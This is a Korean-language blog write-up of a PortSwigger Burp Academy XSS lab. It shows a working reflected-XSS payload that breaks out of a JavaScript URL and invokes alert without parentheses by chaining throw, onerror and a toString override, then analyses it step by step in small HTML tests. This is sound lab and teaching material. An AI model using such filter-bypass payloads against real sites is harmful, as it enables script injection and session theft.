---
layout: post
title: "Burp Academy-XSS 취약점: Reflected XSS in a JavaScript URL with some characters blocked"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XSS취약점]
toc: true
last_modified_at: 2025-02-21 21:55:00 +0900
---

# 개요
- 취약점 설명 주소: https://portswigger.net/web-security/cross-site-scripting/contexts#xss-into-javascript
- 문제 주소: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked
- 난이도: EXPERT (어려움)

# 취약점 설명
일부 웹사이트는 사용할 수 있는 문자를 제한하여 XSS를 더 어렵게 만든다. 이 필터링은 웹사이트 혹은 WAF에서 수행될 수 있다. 이러한 상황에서 공격자는 이러한 보안 조치를 우회하는 함수를 호출하는 다른 방법을 실험해야 한다. 이를 수행하는 한 가지 방법은 `throw` 문과 함께 예외 핸들러를 사용하는 것이다. 이를 통해 괄호를 사용하지 않고도 함수에 파라메터를 전달할 수 있다. 다음 코드는 `alert()`함수를 전역 예외 핸들러에 할당하고 `throw` 명령문으로 예외 핸들러에 `1`을 전달한다. 결과적으로 `alert(1);`이 수행된다.

```js
onerror=alert;throw 1
```

이 테크닉을 사용하여 [괄호 없이 함수를 호출하는 방법](https://portswigger.net/research/xss-without-parentheses-and-semi-colons){:target="_blank"}은 여러 가지가 있다.

다음 랩은 특정 문자를 필터링하는 웹사이트를 보여준다. 랩을 풀려면 위에 설명된 것과 비슷한 테크닉을 사용해야 한다. 

# 랩 설명
- 이 랩은 JavaScript URL에 입력 내용을 반영하지만, 모든 것이 보이는 대로는 아니다. 
- 애플리케이션은 XSS 공격을 방지하기 위해 일부 문자를 차단하고 있다.
- 랩을 풀려면 XSS공격을 수행해서 문자열"1337"이 포함된 메세지를 출력하는 alert창을 호출하라. 

```
This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.

To solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message.
```

# 도전
1. 일단 랩을 살펴본다. 취약점이 있어보이는 곳을 찾는다. 블로그 포스트의 되돌아가기 버튼 부분이 수상하다. 

![](/images/burp-academy-xss-27-1.png)

다음과 같은 코드로 되어 있다. 현재보고 있는 블로그글의 URL이 Javascript에 들어가 있다. URL에 XSS에 사용되는 특수문자가 있으면 이스케이프될지로 모른다. 

```html
<div class="is-linkback">
    <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2'}).finally(_ => window.location = '/')">Back to Blog</a>
</div>
```

2. 공격에 사용 가능한 특수 문자가 있는지 테스트해본다. postId의 값이 존재하지 않는 글번호를 지정하면 HTML페이지가 응답되지 않으므로  `postId=2&"'/>`와 같은 식으로 `&`를 붙여서 다른 파라메터로 인식되도록 해서 테스트해보았다. (전체적인 URL은 `https://{LAB-ID}.web-security-academy.net/post?postId=2&%22%27/%3E`이다. )

결과는 다음과 같았다. 다음을 알 수 있다. 
- 작은 따옴표와 꺽쇠는 URL 인코딩된다. (`'`=>`%27`, `>` => `%3e`)
- 쌍따옴표와 슬래시는 별다른 처리없이 삽입된다. 

![](/images/burp-academy-xss-27-2.png)

3. 페이로드에 alert함수를 붙여서 `postId=2&"'/>alert(1);`로 테스트해본다. 결과는 다음과 같다. alert함수앞에 필요없는 부분이 있어서 발동하지 않는 것으로 보인다. 

![](/images/burp-academy-xss-27-3.png)

4. `postId=2&"onerror="alert(1)"`로 테스트해보았다. 결과는 다음과 같다. 
- 

```html
<div class="is-linkback">
    <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2%26"onerror%3d"alert1"'}).finally(_ => window.location = '/')">Back to Blog</a>
</div>
```

다음을 알 수 있다. 
- `=`가 URL인코드 처리되었다. 
- 괄호(`()`)가 사라졌다.(공백으로 바꼈다.) 

![](/images/burp-academy-xss-27-4.png)

5. 뭔가 다른 접근법이 필요하다. 


# 정답

정답을 보고 시도해보았다. 

`https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27` 로 접근하면 랩이 풀린다. 

무슨 원리일까? 


일단 위의 URL로 접근했을 때의 HTML페이지의 코드는 다음과 같다. 

![](/images/burp-academy-xss-27-6.png)

```html
<div class="is-linkback">
    <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,1337},toString%3dx,window%2b%27%27,{x%3a%27'}).finally(_ => window.location = '/')">Back to Blog</a>
</div>
```

그리고 Back to Blog 버튼을 누르면 다음과 같이 "Uncaught 1337"이라는 문자열이 포함된 alert창이 뜬다. 

![](/images/burp-academy-xss-27-5.png)

랩이 풀렸다는 메세지가 표시된다. 

![](/images/burp-academy-xss-27-success.png)

# 보충설명
아직 잘 이해가 되지 않는다. 이 랩을 설명하는 유튜브 영상이 있다. 여기를 보면 상세히 과정을 설명해주고 있다. 매우 도움이 된다. 

https://youtu.be/bCpBD--GCtQ

## URL 디코딩 후 페이로드를 확인 
일단 페이로드를 URL 디코딩해보자. 다음과 같다. 

```js
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

일단 주석 부분(`/**/`)은 스페이스 대신에 들어간 것으로 생각할 수 있다. 
이 페이로드에서 중요한 부분은 `x=x=>{throw/**/onerror=alert,1337},toString=x,window+''` 다. 나머지 부분은 에러를 나게 하지 않기 위해 붙여준 부분이다. 페이로드를 HTML 문서로 만들어서 하나씩 실행해가면서 분석해보자. 

## 테스트1: Javascript throw문
다음 코드를 html 파일로 저장한 후에 웹 브라우저로 열어본다. 

```html
<h1>Reflected XSS in a JavaScript URL with some characters blocked - Payload Study1</h1>

<!-- 테스트1: Javascript throw문 -->
<script>

throw 1337;

</script>
```

확인결과: 개발자 도구로 콘솔을 확인하면 에러가 출력되어 있다. 

![](/images/burp-academy-xss-27-study-1.png)

## 테스트2: throw와 콤마를 같이 사용하면 어떻게 되는가? 

```html
<h1>Reflected XSS in a JavaScript URL with some characters blocked - Payload Study2</h1>

<!-- 테스트2: throw와 콤마를 같이 사용하면 어떻게 되는가? -->
<script>

throw 1337, 1338;

</script>
```

확인결과: 뒤의 것만 출력된다. 

![](/images/burp-academy-xss-27-study-2.png)

## 테스트3: throw에서 변수를 사용가능한가?

```html 
<h1>Reflected XSS in a JavaScript URL with some characters blocked - Payload Study3</h1>

<!-- 테스트3: throw에서 변수를 사용가능한가? -->
<script>
let myVar = 1;
throw 1337, myVar;

</script>
```

확인결과: 가능하다. 

![](/images/burp-academy-xss-27-study-3.png)

## 테스트4: throw에서 변수에 값 설정이 가능한가?

```html
<h1>Reflected XSS in a JavaScript URL with some characters blocked - Payload Study4</h1>

<!-- 테스트4: throw에서 변수에 값 설정이 가능한가? -->
<script>
let myVar = 1;
throw myVar=1337, myVar;

</script>
```

확인결과: 가능하다. 

![](/images/burp-academy-xss-27-study-4.png)

## 테스트5:  throw onerror 분석 

```html
<h1>Reflected XSS in a JavaScript URL with some characters blocked - Payload Study5</h1>

<!-- 테스트5: throw onerror의 의미는? -->
<script>
throw onerror=alert, 1337;

</script>
```

확인결과: alert창이 떴다. 
- 위의 코드는 Javascript의 기본핸들러 onerror의 동작을 alert함수로 덮어쓴 것이라는 것을 알 수 있다. 
- 그리고 두 번째 파라메터가 alert 함수의 파라메터로 전달된다는 것을 알 수 있다. 
- 또한, alert창을 확인하면 콘솔에도 이전 테스트와 같이  에러메세지가 출력된다. 

![](/images/burp-academy-xss-27-study-5.png)

## 테스트6: x=x 코드의 의미는? 

```html
<h1>Reflected XSS in a JavaScript URL with some characters blocked - Payload Study6</h1>

<!-- 테스트6: x=x 코드의 의미는? -->
<script>
let x = x => {
    throw onerror=alert, 1337;
}

x();
</script>
```

확인결과: 동일하게 alert창이 떴다. 
- x= x => {} 는 x = (x) => {} 와 같았다. 
- 첫번째 x는 함수의 이름이다. 
- 두번째 x는 함수파라메터다. 

![](/images/burp-academy-xss-27-study-6.png)


## 테스트7: toString=x 의 의미는?

```html
<h1>Reflected XSS in a JavaScript URL with some characters blocked - Payload Study7</h1>

<!-- 테스트7: toString=x 의 의미는? -->
<!-- 확인결과: -->
<script>
let x = x => {
    throw onerror=alert, 1337;
}

toString = x;

toString();
</script>
```

확인결과: 동일하게 alert창이 떴다. 
- toString=x는 toString 함수를 덮어쓴 것이라는 것을 알 수 있다. 
- (toString 함수를 호출하면 x가 실행된다.)

![](/images/burp-academy-xss-27-study-7.png)


## 테스트8: window+''의 의미는?
본래 Javascript의 window 오브젝트는 문자열이 아닐 것이다. 여기에 공백문자 `''`를 더해주면 어떻게 되는걸까? 

```html
<h1>Reflected XSS in a JavaScript URL with some characters blocked - Payload Study8</h1>

<!-- 테스트8: window+'' 의 의미는? -->
<!-- 확인결과: toString함수를 트리거하기 위함이었다.-->

<script>
let x = x => {
    throw onerror=alert, 1337;
}

toString = x;

window + '';
</script>
```

![](/images/burp-academy-xss-27-study-8.png)


확인결과: 동일하게 alert창이 떴다.  
- 코드 `window+'' `는 window오브젝트에 공백문자열을 붙여줌으로써 toString함수를 발동시키기 위함인 것을 알 수 있었다. 

## 테스트 9: 어떤 함수의 파라메터를 마음대로 여러개 지정가능한가? 그리고 파라메터에 실행문(statement)을 넣으면 어떻게 되는가? 

예를 들어 다음과 같은 코드가 있다. myFunc는 파라메터 두 개를 받는 함수다. 하단의 콘솔에서는 myFunc에 정의된 파라메터 이 후에 다른 파라메터를 여러개 넘겨주고 있다. 이를 실행시키면 어떤 결과가 나올까? 


```html
<h1>Reflected XSS in a JavaScript URL with some characters blocked - Payload Study9</h1>

<!-- 테스트9: 어떤 함수의 파라메터를 마음대로 여러개 지정가능한가? 그리고 파라메터에 실행문(statement)을 넣으면 어떻게 되는가? -->
<script>
let myVar = 1;
function myFunc(a, b){
    return a + b;
}

console.log(myFunc(1, 2, 3, 4, myVar=10, 6));
console.log(myVar);
</script>
```



확인결과: myFunc 함수의 실행결과는 3이다. myFunc 함수에 정의된 대로 첫번째와 두번째 파라메터만 받아서 실행한다. 재밌는 것은 myVar의 결과이다. myFunc함수에 파라메터로 넘겨준 실행문(myVar=10)이 실행된 것을 알 수 있다. 이 것으로 다음 두 가지를 알 수 있다. 
- 함수에 정의되지 않은 파라메터라도 전달이 가능하다. 
- 함수에 전달된 파라메터는 "실행"된다.(혹은 평가(evaluate)된다.)

![](/images/burp-academy-xss-27-study-9.png)

## 파라메터 분석 최종
여기까지 이해한 뒤에 다시 페이로드가 삽입된 모습을 보면 안보였던 게 보인다. 

```html
  <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,1337},toString%3dx,window%2b%27%27,{x%3a%27'}).finally(_ => window.location = '/')">Back to Blog</a>
```

URL 디코딩한 모습
- 페이로드의 처음 부분 `'},`는 fetch 함수의 두 번째 파라메터를 분리해주기 위함이었다. 
- `x=x...`부분은 fetch 함수의 세번째 파라메터이며, 에러가 발생했을 때 alert(1337)을 실행하는 코드를 정의하고 있다. 
- `toString=x`는 fetch 함수의 네번째 파라메터이며, toString함수의 동작을 덮어쓴다. 
- `window+''`는 fetch 함수의 다섯번째 파라메터이며, window오브젝트에 공백 문자열을 붙임으로서 toString함수를 발송시킨다.
- 페이로드의 마지막 부분 `{x:'`는 원래 있던 부분 `'}`와 짝을 맞춰주어 문법에러가 발생하지 않도록 해주기 위함이다. 

```js
javascript:fetch('/analytics', {method:'post',body:'/post?postId=2&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ => window.location = '/')
```


# 참고
- 이 취약점에 대한 PortSwigger의 Gareth Heyes씨의 기술문서: https://portswigger.net/research/xss-without-parentheses-and-semi-colons
